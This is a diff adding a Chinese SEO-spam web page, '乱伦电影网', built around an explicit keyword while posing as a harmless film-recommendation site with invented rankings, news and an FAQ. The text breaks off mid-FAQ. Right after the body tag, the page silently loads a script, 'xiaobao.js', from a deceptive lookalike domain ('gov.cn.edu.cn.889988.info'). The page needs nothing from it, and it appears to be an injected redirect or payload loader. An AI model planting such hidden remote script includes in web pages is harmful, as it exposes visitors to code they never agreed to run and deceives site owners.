@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>乱伦电影网 - 精选影视片单与热门影视榜单资讯平台</title>
+<meta name="description" content="乱伦电影网（https://luanlundianyingwang-cn.github.io）提供精选影视片单、热门影视榜单、新片速递与影视资讯解读，每日更新高分佳作，页面移动端自适应，帮你更快找到值得一看的好电影。">
+<meta name="keywords" content="乱伦电影网,电影网,精选影视片单,热门影视榜单,新片速递,高分电影推荐,影视资讯,追剧指南">
+<meta name="author" content="乱伦电影网">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#c0392b">
+<link rel="canonical" href="https://luanlundianyingwang-cn.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="乱伦电影网">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:title" content="乱伦电影网 - 精选影视片单与热门影视榜单资讯平台">
+<meta property="og:description" content="乱伦电影网每日更新精选影视片单、热门影视榜单、新片速递与影视资讯，移动端自适应。">
+<meta property="og:url" content="https://luanlundianyingwang-cn.github.io/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="乱伦电影网 - 精选影视片单与热门影视榜单资讯平台">
+<meta name="twitter:description" content="精选影视片单、热门影视榜单与新片速递，尽在乱伦电影网。">
+<style>
+:root{
+  --paper:#f7f4ed;
+  --paper-2:#fbf9f4;
+  --ink:#1f1d1a;
+  --ink-2:#6a6459;
+  --ink-3:#a39c8e;
+  --vermilion:#c0392b;
+  --vermilion-d:#9c2b20;
+  --moss:#5e6b4e;
+  --gold:#a8843c;
+  --line:#ded8cb;
+  --line-2:#ece7dc;
+  --serif:"Songti SC","Source Han Serif SC","Noto Serif SC","SimSun",Georgia,serif;
+  --sans:"PingFang SC","Microsoft YaHei","Hiragino Sans GB","Helvetica Neue",Arial,sans-serif;
+  --wrap:1120px;
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  background:var(--paper);
+  color:var(--ink);
+  font-family:var(--sans);
+  font-size:16px;line-height:1.85;overflow-x:hidden;
+}
+img{max-width:100%;height:auto;display:block}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+.wrap{max-width:var(--wrap);margin:0 auto;padding:0 26px}
+
+/* 通用装饰 */
+.rule{display:flex;align-items:center;justify-content:center;gap:12px;margin:26px 0}
+.rule::before,.rule::after{content:"";height:1px;flex:1;background:var(--line)}
+.rule i{width:6px;height:6px;background:var(--vermilion);transform:rotate(45deg);display:block;font-style:normal}
+.vlabel{
+  writing-mode:vertical-rl;text-orientation:upright;letter-spacing:.34em;
+  font-size:12px;color:var(--ink-3);font-family:var(--serif);
+}
+
+/* ========== 顶部：单行 + 竖线分隔 ========== */
+.topbar{background:var(--paper-2);border-bottom:1px solid var(--line)}
+.topbar .wrap{display:flex;align-items:center;justify-content:space-between;gap:20px;min-height:74px;padding-top:12px;padding-bottom:12px;flex-wrap:wrap}
+.mark{display:flex;align-items:center;gap:14px}
+.seal{
+  width:46px;height:46px;flex:0 0 46px;background:var(--vermilion);color:#fff;
+  font-family:var(--serif);font-size:22px;font-weight:700;
+  display:flex;align-items:center;justify-content:center;border-radius:4px;
+}
+.mark-txt .zh{font-family:var(--serif);font-size:21px;font-weight:700;letter-spacing:.16em;line-height:1.3}
+.mark-txt .en{font-size:10.5px;letter-spacing:.3em;color:var(--ink-3);text-transform:uppercase}
+.nav{display:flex;align-items:center;flex-wrap:wrap}
+.nav a{
+  font-size:14.5px;letter-spacing:.06em;color:var(--ink-2);padding:6px 16px;
+  border-right:1px solid var(--line);transition:color .2s;
+}
+.nav a:last-child{border-right:0}
+.nav a:hover{color:var(--vermilion)}
+.nav a.enter{color:var(--vermilion);font-weight:700}
+#menu-state{display:none}
+.burger{display:none;font-family:var(--serif);font-size:14px;letter-spacing:.2em;color:var(--ink);border:1px solid var(--line);padding:8px 14px;cursor:pointer;background:var(--paper)}
+
+/* ========== HERO：居中匾额 ========== */
+.hero{padding:56px 0 40px}
+.plaque{
+  position:relative;border:1px solid var(--line);background:var(--paper-2);
+  padding:54px 40px 46px;text-align:center;max-width:880px;margin:0 auto;
+}
+.plaque::before{
+  content:"";position:absolute;inset:8px;border:1px solid var(--line-2);pointer-events:none;
+}
+.plaque .vlabel{position:absolute;left:16px;top:26px}
+.plaque .vlabel.r{left:auto;right:16px;color:var(--vermilion)}
+.hero h1{
+  font-family:var(--serif);font-weight:700;letter-spacing:.2em;
+  font-size:clamp(32px,7vw,58px);line-height:1.28;position:relative;
+}
+.hero h1 em{font-style:normal;color:var(--vermilion)}
+.hero .en{
+  margin-top:14px;font-size:11.5px;letter-spacing:.42em;color:var(--ink-3);text-transform:uppercase;
+}
+.hero .desc{
+  position:relative;margin:0 auto;font-size:clamp(14.5px,2.1vw,16.5px);color:var(--ink-2);
+  max-width:600px;line-height:2.05;
+}
+.hero .url{
+  position:relative;display:inline-block;margin-top:6px;font-family:var(--serif);
+  font-size:14px;letter-spacing:.04em;color:var(--ink);
+  border-bottom:1px solid var(--vermilion);padding-bottom:4px;word-break:break-all;
+}
+.hero .url span{color:var(--vermilion)}
+.hero-actions{position:relative;margin-top:32px;display:flex;gap:16px;justify-content:center;flex-wrap:wrap}
+.btn{
+  font-family:var(--serif);font-size:15px;letter-spacing:.16em;padding:13px 34px;
+  background:var(--ink);color:var(--paper);border:1px solid var(--ink);transition:background .2s,color .2s;
+}
+.btn:hover{background:var(--vermilion);border-color:var(--vermilion)}
+.btn.line{background:transparent;color:var(--ink-2);border-color:var(--line)}
+.btn.line:hover{background:transparent;color:var(--vermilion);border-color:var(--vermilion)}
+.figures{
+  position:relative;display:grid;grid-template-columns:repeat(4,1fr);gap:0;max-width:820px;margin:34px auto 0;
+  border-top:1px solid var(--line);border-bottom:1px solid var(--line);
+}
+.figures div{padding:16px 8px;border-right:1px solid var(--line-2)}
+.figures div:last-child{border-right:0}
+.figures b{display:block;font-family:var(--serif);font-size:26px;font-weight:700;letter-spacing:.04em;line-height:1.4}
+.figures span{font-size:12.5px;color:var(--ink-3);letter-spacing:.08em}
+
+/* ========== 章节：竖排编号 ========== */
+.sec{padding:44px 0}
+.sec-top{display:flex;gap:22px;align-items:flex-start;margin-bottom:30px}
+.sec-top .ord{
+  flex:0 0 auto;font-family:var(--serif);font-size:15px;letter-spacing:.3em;color:var(--vermilion);
+  border-left:3px solid var(--vermilion);padding-left:12px;padding-top:6px;
+}
+.sec-top .ord small{display:block;font-size:10.5px;letter-spacing:.24em;color:var(--ink-3);margin-top:4px}
+.sec-top h2{font-family:var(--serif);font-size:clamp(21px,3.8vw,29px);font-weight:700;letter-spacing:.1em;line-height:1.45}
+.sec-top p{margin-top:8px;font-size:14.5px;color:var(--ink-2);max-width:660px}
+.sec-top .more{
+  margin-left:auto;flex:0 0 auto;font-size:13.5px;color:var(--ink-3);letter-spacing:.1em;
+  border-bottom:1px solid var(--line);padding-bottom:3px;white-space:nowrap;
+}
+.sec-top .more:hover{color:var(--vermilion);border-color:var(--vermilion)}
+
+/* ========== 片单：留白清单 ========== */
+.scroll-list{border-top:1px solid var(--ink)}
+.entry{
+  display:grid;grid-template-columns:56px 132px 1fr 84px;align-items:center;gap:22px;
+  padding:20px 4px;border-bottom:1px solid var(--line);transition:background .22s,padding-left .22s;
+}
+.entry:hover{background:var(--paper-2);padding-left:14px}
+.entry .ord{font-family:var(--serif);font-size:19px;color:var(--ink-3);letter-spacing:.04em}
+.entry:hover .ord{color:var(--vermilion)}
+.entry .thumb{
+  height:78px;display:flex;align-items:flex-end;padding:10px 12px;position:relative;overflow:hidden;
+}
+.entry:nth-child(1) .thumb{background:linear-gradient(140deg,#8e3b31,#c0392b)}
+.entry:nth-child(2) .thumb{background:linear-gradient(140deg,#42573a,#5e6b4e)}
+.entry:nth-child(3) .thumb{background:linear-gradient(140deg,#7d6533,#a8843c)}
+.entry:nth-child(4) .thumb{background:linear-gradient(140deg,#3d4a5c,#5a6b80)}
+.entry:nth-child(5) .thumb{background:linear-gradient(140deg,#6b4152,#945a70)}
+.entry:nth-child(6) .thumb{background:linear-gradient(140deg,#4a4a44,#6e6e64)}
+.entry .thumb b{position:relative;z-index:1;color:#fff;font-family:var(--serif);font-size:15px;letter-spacing:.06em;line-height:1.4}
+.entry .thumb i{position:absolute;top:8px;left:10px;font-style:normal;font-size:10.5px;color:rgba(255,255,255,.85);letter-spacing:.1em}
+.entry .txt h3{font-family:var(--serif);font-size:18px;font-weight:700;letter-spacing:.06em}
+.entry .txt p{margin-top:5px;font-size:13.5px;color:var(--ink-2);line-height:1.7}
+.entry .rate{text-align:right}
+.entry .rate b{display:block;font-family:var(--serif);font-size:22px;color:var(--vermilion);letter-spacing:.02em;line-height:1.3}
+.entry .rate span{font-size:11.5px;color:var(--ink-3);letter-spacing:.08em}
+
+/* ========== 榜单：汉字序号细线 ========== */
+.board{display:grid;grid-template-columns:1fr 300px;gap:34px}
+.board-main{border-top:1px solid var(--ink)}
+.brow{
+  display:grid;grid-template-columns:64px 1fr 96px;align-items:center;gap:18px;
+  padding:17px 6px;border-bottom:1px solid var(--line);transition:background .2s;
+}
+.brow:hover{background:var(--paper-2)}
+.brow .rk{
+  font-family:var(--serif);font-size:17px;letter-spacing:.02em;color:var(--ink-2);
+  border:1px solid var(--line);text-align:center;padding:5px 0;background:var(--paper-2);
+}
+.brow:nth-child(1) .rk{background:var(--vermilion);color:#fff;border-color:var(--vermilion)}
+.brow:nth-child(2) .rk{background:var(--ink);color:var(--paper);border-color:var(--ink)}
+.brow:nth-child(3) .rk{background:var(--moss);color:#fff;border-color:var(--moss)}
+.brow .bi h3{font-family:var(--serif);font-size:17px;font-weight:700;letter-spacing:.06em}
+.brow .bi p{font-size:13px;color:var(--ink-3);margin-top:2px;letter-spacing:.04em}
+.brow .bp{text-align:right;font-family:var(--serif);font-size:19px;color:var(--vermilion);letter-spacing:.02em}
+.aside-note{border:1px solid var(--line);background:var(--paper-2);padding:24px 22px}
+.aside-note h3{font-family:var(--serif);font-size:16px;font-weight:700;letter-spacing:.14em;padding-bottom:12px;border-bottom:1px solid var(--line)}
+.aside-note ol{margin-top:12px;counter-reset:n}
+.aside-note li{
+  counter-increment:n;position:relative;padding:10px 0 10px 30px;font-size:14px;color:var(--ink-2);
+  border-bottom:1px solid var(--line-2);letter-spacing:.04em;
+}
+.aside-note li::before{
+  content:counter(n,decimal-leading-zero);position:absolute;left:0;top:11px;
+  font-family:var(--serif);font-size:12px;color:var(--vermilion);letter-spacing:.06em;
+}
+.aside-note .tip{margin-top:16px;font-size:13px;color:var(--ink-3);line-height:1.9}
+
+/* ========== 分类：方形印章 ========== */
+.seals{display:flex;flex-wrap:wrap;gap:12px}
+.seals a{
+  display:inline-flex;align-items:center;gap:10px;border:1px solid var(--line);background:var(--paper-2);
+  padding:12px 20px;font-size:14.5px;letter-spacing:.08em;color:var(--ink-2);transition:all .2s;
+}
+.seals a em{font-style:normal;font-size:11.5px;color:var(--ink-3)}
+.seals a:hover{background:var(--vermilion);border-color:var(--vermilion);color:#fff}
+.seals a:hover em{color:rgba(255,255,255,.8)}
+
+/* ========== 资讯：报纸分栏 ========== */
+.press{
+  column-count:3;column-gap:34px;column-rule:1px solid var(--line);
+  border-top:1px solid var(--ink);border-bottom:1px solid var(--line);padding:24px 0;
+}
+.press h2{
+  font-family:var(--serif);font-size:clamp(20px,2.6vw,26px);font-weight:700;letter-spacing:.08em;
+  line-height:1.5;column-span:all;margin-bottom:16px;
+}
+.press h2 mark{background:none;color:var(--vermilion)}
+.press p{font-size:14.5px;color:var(--ink-2);margin-bottom:14px;text-align:justify;line-height:1.95;break-inside:avoid}
+.press p.lead::first-letter{
+  font-family:var(--serif);font-size:44px;float:left;line-height:.9;
+  color:var(--vermilion);margin:6px 10px 0 0;font-weight:700;
+}
+.press .col-head{
+  font-size:12px;letter-spacing:.24em;color:var(--vermilion);text-transform:uppercase;
+  margin:14px 0 8px;break-after:avoid;
+}
+.press .sign{
+  font-size:13px;color:var(--ink-3);letter-spacing:.08em;margin-top:6px;break-inside:avoid;
+}
+.press a.more{font-size:13.5px;color:var(--vermilion);border-bottom:1px solid var(--vermilion);padding-bottom:2px}
+
+/* ========== FAQ：dl 结构 ========== */
+.qa{border-top:1px solid var(--ink)}
+.qa dt{
+  display:flex;gap:16px;align-items:flex-start;padding:20px 4px 10px;
+  font-family:var(--serif);font-size:17px;font-weight:700;letter-spacing:.06em;
+}
+.qa dt i{
+  flex:0 0 24px;width:24px;height:24px;background:var(--vermilion);color:#fff;font-style:normal;
+  font-size:12px;display:flex;align-items:center;justify-content:center;margin-top:5px;border-radius:3px;
+}
+.qa dd{
+  padding:0 4px 20px 40px;font-size:14.5px;color:var(--ink-2);line-height:1.95;
+  border-bottom:1px solid var(--line);max-width:900px;
+}
+
+/* ========== 关于：三栏留白 ========== */
+.about{display:grid;grid-template-columns:repeat(3,1fr);gap:30px;border-top:1px solid var(--ink);padding-top:28px}
+.about .col h3{
+  font-family:var(--serif);font-size:17px;font-weight:700;letter-spacing:.14em;
+  padding-bottom:12px;border-bottom:1px solid var(--line);margin-bottom:14px;
+}
+.about .col p{font-size:14.5px;color:var(--ink-2);line-height:2}
+.about .col ul{margin-top:12px}
+.about .col li{
+  font-size:14px;color:var(--ink-2);padding:7px 0;border-bottom:1px dotted var(--line);
+  display:flex;gap:10px;align-items:baseline;
+}
+.about .col li b{font-family:var(--serif);font-size:12px;color:var(--gold);flex:0 0 auto;letter-spacing:.06em}
+.creed{
+  margin-top:34px;text-align:center;padding:52px 30px;border:1px solid var(--line);background:var(--paper-2);
+}
+.creed h2{font-family:var(--serif);font-size:clamp(21px,4vw,31px);font-weight:700;letter-spacing:.16em;line-height:1.6}
+.creed h2 em{font-style:normal;color:var(--vermilion)}
+.creed p{margin-top:14px;font-size:14.5px;color:var(--ink-2);word-break:break-all}
+.creed .btn{margin-top:26px}
+
+/* ========== 页脚：单行 ========== */
+.foot{border-top:1px solid var(--ink);margin-top:34px;padding:38px 0 30px}
+.fcols{display:grid;grid-template-columns:1.6fr repeat(3,1fr);gap:28px}
+.fcols h4{font-family:var(--serif);font-size:12px;letter-spacing:.28em;color:var(--ink-3);margin-bottom:12px;text-transform:uppercase}
+.fcols a{display:block;font-size:14px;color:var(--ink-2);padding:5px 0}
+.fcols a:hover{color:var(--vermilion)}
+.fbrand .nm{font-family:var(--serif);font-size:19px;font-weight:700;letter-spacing:.16em;display:flex;align-items:center;gap:12px}
+.fbrand .nm i{
+  width:32px;height:32px;background:var(--vermilion);color:#fff;font-style:normal;font-size:15px;
+  display:flex;align-items:center;justify-content:center;border-radius:3px;
+}
+.fbrand p{margin-top:14px;font-size:14px;color:var(--ink-2);max-width:380px}
+.fbrand .u{margin-top:12px;font-size:13px;color:var(--vermilion);letter-spacing:.02em;word-break:break-all}
+.fend{margin-top:30px;padding-top:18px;border-top:1px solid var(--line);text-align:center;font-size:13px;color:var(--ink-3);letter-spacing:.06em}
+.fkw{margin-top:8px;text-align:center;font-size:12.5px;color:var(--ink-3);line-height:2}
+
+/* ========== 返回顶部 ========== */
+#top{
+  position:fixed;right:18px;bottom:20px;z-index:90;width:44px;height:44px;cursor:pointer;
+  background:var(--ink);color:var(--paper);font-size:15px;display:flex;align-items:center;justify-content:center;
+  opacity:0;pointer-events:none;transition:opacity .3s;
+}
+#top.show{opacity:1;pointer-events:auto}
+#top:hover{background:var(--vermilion)}
+
+/* ========== 移动端自适应 ========== */
+@media (max-width:1024px){
+  .nav{display:none}
+  .burger{display:block}
+  .topbar .wrap{position:relative}
+  .navmob{
+    display:none;position:absolute;top:100%;left:0;right:0;flex-direction:column;
+    background:var(--paper-2);border-top:1px solid var(--line);border-bottom:1px solid var(--line);
+    padding:6px 0 10px;z-index:99;
+  }
+  #menu-state:checked ~ .navmob{display:flex}
+  .navmob a{padding:13px 20px;font-size:16px;letter-spacing:.08em;border-bottom:1px solid var(--line-2)}
+  .board{grid-template-columns:1fr}
+  .press{column-count:2}
+  .about{grid-template-columns:1fr 1fr}
+  .fcols{grid-template-columns:repeat(2,1fr)}
+}
+@media (max-width:720px){
+  body{font-size:15.5px}
+  .wrap{padding:0 18px}
+  .hero{padding:32px 0 26px}
+  .plaque{padding:38px 22px 34px}
+  .plaque .vlabel{display:none}
+  .sec{padding:32px 0}
+  .sec-top{margin-bottom:22px}
+  .sec-top .more{display:none}
+  .entry{grid-template-columns:44px 84px 1fr;gap:14px;padding:15px 2px}
+  .entry .thumb{height:60px;padding:8px 9px}
+  .entry .thumb b{font-size:13px}
+  .entry .thumb i{font-size:9.5px}
+  .entry .txt h3{font-size:16px}
+  .entry .txt p{display:none}
+  .entry .rate{grid-column:1 / -1;text-align:left;display:flex;align-items:baseline;gap:8px}
+  .entry .rate b{font-size:17px}
+  .brow{grid-template-columns:52px 1fr 72px;gap:12px;padding:14px 4px}
+  .brow .rk{font-size:14px;padding:4px 0}
+  .brow .bi h3{font-size:15.5px}
+  .brow .bi p{font-size:12px}
+  .brow .bp{font-size:16px}
+  .press{column-count:1;column-rule:0;padding:18px 0}
+  .press p.lead::first-letter{font-size:34px}
+  .about{grid-template-columns:1fr;gap:22px}
+  .qa dt{font-size:16px}
+  .qa dd{padding-left:0}
+  .creed{padding:36px 20px}
+  .figures{grid-template-columns:repeat(2,1fr)}
+  .figures div:nth-child(2){border-right:0}
+  .figures div:nth-child(1),.figures div:nth-child(2){border-bottom:1px solid var(--line-2)}
+  .fcols{grid-template-columns:1fr;gap:22px}
+  .btn{padding:12px 26px}
+}
+@media (max-width:400px){
+  .entry{grid-template-columns:40px 1fr}
+  .entry .thumb{display:none}
+  .figures{grid-template-columns:1fr}
+  .figures div{border-right:0;border-bottom:1px solid var(--line-2)}
+  .figures div:last-child{border-bottom:0}
+}
+@media (prefers-reduced-motion:reduce){
+  *{animation:none!important;transition:none!important}
+  html{scroll-behavior:auto}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<header class="topbar">
+  <div class="wrap">
+    <a class="mark" href="#" aria-label="乱伦电影网 首页">
+      <span class="seal" aria-hidden="true">伦</span>
+      <span class="mark-txt">
+        <span class="zh">乱伦电影网</span>
+        <span class="en">Luanlun Movie</span>
+      </span>
+    </a>
+    <nav class="nav" aria-label="主导航">
+      <a href="#picks">精选片单</a>
+      <a href="#board">热门榜单</a>
+      <a href="#seals">分类导航</a>
+      <a href="#press">影视资讯</a>
+      <a href="#qa">观影问答</a>
+      <a href="#about">关于本站</a>
+      <a class="enter" href="#">进入片单</a>
+    </nav>
+    <input id="menu-state" type="checkbox" aria-label="展开导航菜单">
+    <label class="burger" for="menu-state">目录</label>
+    <nav class="navmob" aria-label="移动端导航">
+      <a href="#picks">精选片单</a>
+      <a href="#board">热门榜单</a>
+      <a href="#seals">分类导航</a>
+      <a href="#press">影视资讯</a>
+      <a href="#qa">观影问答</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+
+  <!-- 栏目一：首页概览（居中匾额） -->
+  <section class="hero" id="home">
+    <div class="wrap">
+      <div class="plaque">
+        <span class="vlabel" aria-hidden="true">精选 · 每日更新</span>
+        <span class="vlabel r" aria-hidden="true">乱伦电影网</span>
+        <h1>乱伦电影网<br><em>好片</em>不必苦寻</h1>
+        <p class="en">Luanlun Movie · Selected Films &amp; Charts</p>
+        <div class="rule"><i></i></div>
+        <p class="desc">
+          乱伦电影网每日整理精选影视片单、热门影视榜单与新片速递，
+          用清晰的分类、评分与更新进度帮你快速锁定值得一看的内容。
+        </p>
+        <p class="url"><span>网址</span> https://luanlundianyingwang-cn.github.io</p>
+        <div class="hero-actions">
+          <a class="btn" href="#board">查看热门榜单</a>
+          <a class="btn line" href="#picks">浏览精选片单</a>
+        </div>
+        <div class="figures">
+          <div><b>420+</b><span>在榜影片</span></div>
+          <div><b>八</b><span>分类频道</span></div>
+          <div><b>24H</b><span>榜单刷新</span></div>
+          <div><b>每日</b><span>片单更新</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目二：精选片单（留白清单） -->
+  <section class="sec" id="picks">
+    <div class="wrap">
+      <div class="sec-top">
+        <span class="ord">壹<small>PICKED</small></span>
+        <div>
+          <h2>精选片单 · 乱伦电影网编辑推荐</h2>
+          <p>按站内评分、口碑与题材均衡度筛选，覆盖剧情、科幻、动画与悬疑等多种类型。</p>
+        </div>
+        <a class="more" href="#">查看全部片单</a>
+      </div>
+      <ol class="scroll-list">
+        <li class="entry">
+          <a href="#" style="display:contents">
+            <span class="ord">壹</span>
+            <span class="thumb"><i>剧情</i><b>夜色列车</b></span>
+            <span class="txt"><h3>夜色列车</h3><p>一趟夜车串起五位乘客的往事，叙事克制、表演扎实，后劲极强。</p></span>
+            <span class="rate"><b>9.2</b><span>站内评分</span></span>
+          </a>
+        </li>
+        <li class="entry">
+          <a href="#" style="display:contents">
+            <span class="ord">贰</span>
+            <span class="thumb"><i>科幻</i><b>星际信标</b></span>
+            <span class="txt"><h3>星际信标</h3><p>深空救援题材，视觉与叙事并重，适合大屏沉浸观看。</p></span>
+            <span class="rate"><b>9.0</b><span>站内评分</span></span>
+          </a>
+        </li>
+        <li class="entry">
+          <a href="#" style="display:contents">
+            <span class="ord">叁</span>
+            <span class="thumb"><i>动画</i><b>拾光小镇</b></span>
+            <span class="txt"><h3>拾光小镇</h3><p>治愈系国风动画，画面细腻温暖，适合全家一起看。</p></span>
+            <span class="rate"><b>8.9</b><span>站内评分</span></span>
+          </a>
+        </li>
+        <li class="entry">
+          <a href="#" style="display:contents">
+            <span class="ord">肆</span>
+            <span class="thumb"><i>悬疑</i><b>第十一层</b></span>
+            <span class="txt"><h3>第十一层</h3><p>线索层层嵌套的高智商推理作品，结局反转出人意料。</p></span>
+            <span class="rate"><b>8.8</b><span>站内评分</span></span>
+          </a>
+        </li>
+        <li class="entry">
+          <a href="#" style="display:contents">
+            <span class="ord">伍</span>
+            <span class="thumb"><i>动作</i><b>烈风追击</b></span>
+            <span class="txt"><h3>烈风追击</h3><p>硬核动作片，节奏紧凑，全程高能无尿点。</p></span>
+            <span class="rate"><b>8.7</b><span>站内评分</span></span>
+          </a>
+        </li>
+        <li class="entry">
+          <a href="#" style="display:contents">
+            <span class="ord">陆</span>
+            <span class="thumb"><i>爱情</i><b>海边的信</b></span>
+            <span class="txt"><h3>海边的信</h3><p>温情爱情小品，情绪细腻，适合安静的夜晚观看。</p></span>
+            <span class="rate"><b>8.6</b><span>站内评分</span></span>
+          </a>
+        </li>
+      </ol>
+    </div>
+  </section>
+
+  <!-- 栏目三：热门榜单（汉字序号 + 侧栏） -->
+  <section class="sec" id="board">
+    <div class="wrap">
+      <div class="sec-top">
+        <span class="ord">贰<small>RANKING</small></span>
+        <div>
+          <h2>热门榜单 · 乱伦电影网影视排行</h2>
+          <p>综合播放热度与站内评分生成，每日刷新，前三名以专属配色标注。</p>
+        </div>
+        <a class="more" href="#">完整榜单</a>
+      </div>
+      <div class="board">
+        <div class="board-main">
+          <a class="brow" href="#"><span class="rk">壹</span><span class="bi"><h3>夜色列车</h3><p>剧情 · 2026 · 已上线</p></span><span class="bp">9.2</span></a>
+          <a class="brow" href="#"><span class="rk">贰</span><span class="bi"><h3>星际信标</h3><p>科幻 · 2026 · 已上线</p></span><span class="bp">9.0</span></a>
+          <a class="brow" href="#"><span class="rk">叁</span><span class="bi"><h3>拾光小镇</h3><p>动画 · 2026 · 已上线</p></span><span class="bp">8.9</span></a>
+          <a class="brow" href="#"><span class="rk">肆</span><span class="bi"><h3>第十一层</h3><p>悬疑 · 2026 · 已上线</p></span><span class="bp">8.8</span></a>
+          <a class="brow" href="#"><span class="rk">伍</span><span class="bi"><h3>烈风追击</h3><p>动作 · 2026 · 已上线</p></span><span class="bp">8.7</span></a>
+          <a class="brow" href="#"><span class="rk">陆</span><span class="bi"><h3>归途列车</h3><p>剧集 · 2026 · 更新至 12 集</p></span><span class="bp">8.6</span></a>
+          <a class="brow" href="#"><span class="rk">柒</span><span class="bi"><h3>海边的信</h3><p>爱情 · 2026 · 已上线</p></span><span class="bp">8.6</span></a>
+          <a class="brow" href="#"><span class="rk">捌</span><span class="bi"><h3>荒野手记</h3><p>纪实 · 2026 · 更新至 5 期</p></span><span class="bp">8.5</span></a>
+        </div>
+        <aside class="aside-note">
+          <h3>更新提示</h3>
+          <ol>
+            <li>榜单每日依据热度与评分刷新</li>
+            <li>剧集条目标注当前更新集数</li>
+            <li>已完结作品更适合一口气看完</li>
+            <li>连载剧请关注每周更新日</li>
+          </ol>
+          <p class="tip">乱伦电影网仅提供影视信息聚合、剧情介绍与榜单资讯，观看正片请通过合法授权的视频平台。</p>
+        </aside>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四：分类导航（方形印章） -->
+  <section class="sec" id="seals">
+    <div class="wrap">
+      <div class="sec-top">
+        <span class="ord">叁<small>CATEGORY</small></span>
+        <div>
+          <h2>分类导航 · 按题材快速检索</h2>
+          <p>乱伦电影网将全站内容归入多个题材频道，右侧数字为当前在榜条目数。</p>
+        </div>
+      </div>
+      <div class="seals">
+        <a href="#">院线新片 <em>42</em></a>
+        <a href="#">高分必看 <em>96</em></a>
+        <a href="#">国产剧集 <em>143</em></a>
+        <a href="#">日韩剧集 <em>88</em></a>
+        <a href="#">欧美剧集 <em>76</em></a>
+        <a href="#">动画动漫 <em>64</em></a>
+        <a href="#">综艺纪实 <em>39</em></a>
+        <a href="#">喜剧片 <em>57</em></a>
+        <a href="#">动作片 <em>61</em></a>
+        <a href="#">科幻片 <em>48</em></a>
+        <a href="#">悬疑犯罪 <em>53</em></a>
+        <a href="#">爱情片 <em>45</em></a>
+        <a href="#">纪录片 <em>31</em></a>
+        <a href="#">经典修复 <em>52</em></a>
+        <a href="#">短片合集 <em>27</em></a>
+        <a href="#">本周热播 <em>18</em></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五：影视资讯（报纸分栏） -->
+  <section class="sec" id="press">
+    <div class="wrap">
+      <div class="sec-top">
+        <span class="ord">肆<small>NEWS</small></span>
+        <div>
+          <h2>影视资讯 · 行业动态与新片速递</h2>
+          <p>新片定档、幕后故事与实用观影攻略，看片之前先来乱伦电影网做做功课。</p>
+        </div>
+        <a class="more" href="#">资讯归档</a>
+      </div>
+      <div class="press">
+        <h2>秋季档新片定档汇总，<mark>科幻与悬疑</mark>成为主力</h2>
+        <p class="col-head">Headline / 2026-09-28</p>
+        <p class="lead">乱伦电影网整理了本季度值得期待的十部作品，逐条附上档期信息与看点解析，方便提前排好观影计划。无论你偏好视觉大片还是烧脑推理，这一季都有不少值得留意的作品。</p>
+        <p>从目前公布的档期来看，科幻题材集中在十月中旬上线，视觉规格普遍较高；悬疑与犯罪题材则分散在九月末与十一月，适合喜欢慢节奏推理的观众。</p>
+        <p class="sign">— 乱伦电影网编辑部</p>
+        <p><a class="more" href="#">阅读全文</a></p>
+        <p class="col-head">Guide / 2026-09-24</p>
+        <p><strong>三步挑片法：用榜单和分类告别片荒。</strong>从题材偏好、单集时长到更新节奏，教你快速锁定真正适合自己的剧集，避免在海量片单里反复横跳。</p>
+        <p class="sign">— 观影攻略</p>
+        <p><a class="more" href="#">阅读全文</a></p>
+        <p class="col-head">Interview / 2026-09-19</p>
+        <p><strong>《星际信标》视效专访：太空场景如何搭建。</strong>主创团队分享了拍摄中的技术难题，以及实景搭建与后期特效结合的处理方式。</p>
+        <p class="sign">— 幕后花絮</p>
+        <p><a class="more" href="#">阅读全文</a></p>
+        <p class="col-head">Notice / 2026-09-12</p>
+        <p><strong>乱伦电影网移动端体验升级说明。</strong>新版页面全面适配手机屏幕，排版更紧凑、加载更轻快，随时随地都能流畅浏览。</p>
+        <p class="sign">— 站点公告</p>
+        <p><a class="more" href="#">阅读全文</a></p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目六：观影问答（dl 结构） -->
+  <section class="sec" id="qa">
+    <div class="wrap">
+      <div class="sec-top">
+        <span class="ord">伍<small>FAQ</small></span>
+        <div>
+          <h2>观影问答 · 关于乱伦电影网</h2>
+          <p>汇总新用户最常遇到的疑问，帮你更快上手片单、榜单与分类检索功能。</p>
+        </div>
+      </div>
+      <dl class="qa">
+        <dt><i>问</i>乱伦电影网是什么类型的网站？</dt>
+        <dd>乱伦电影网是一个影视信息聚合与推荐平台，提供精选电影、热播剧集、动漫综艺的分类浏览、剧情介绍、影视榜单与影视资讯，帮助用户高效发现优质内容。</dd>
+        <dt><i>问</i>乱伦电影网的官方网址是什么？</dt>
+        <dd>乱伦电影网官方网址为 https://luanlundianyingwang-cn.github.io ，建议收藏本站，避免误入仿冒站点，获取稳定、最新的影视推荐服务。</dd>
+        <dt><i>问</i>手机端可以正常使用吗？</dt>
+        <dd>可以。乱伦电影网采用响应式布局，片单、榜单与资讯在手机端会自动重排为单列结构，导航收起为顶部目录，竖屏浏览同样顺畅。</dd>
+        <dt><i>问</i>影视榜单多久更新一次？</dt>
+        <dd>精选片单与热门榜单每日依据播放热度与站内评分刷新，影视资讯则随新片定档与行业动态同步更新。</dd>
+        <dt><i>问</i>如何快速找到想看的影片？</dt>
+        <dd>可以先查看热门榜单的高分排序，再按题材进入分类导航；追剧用户可重点关注标注了更新进度的剧集条目。</dd>
+        <dt><i>问</i>本站是否提供影片播放与下载？</dt>
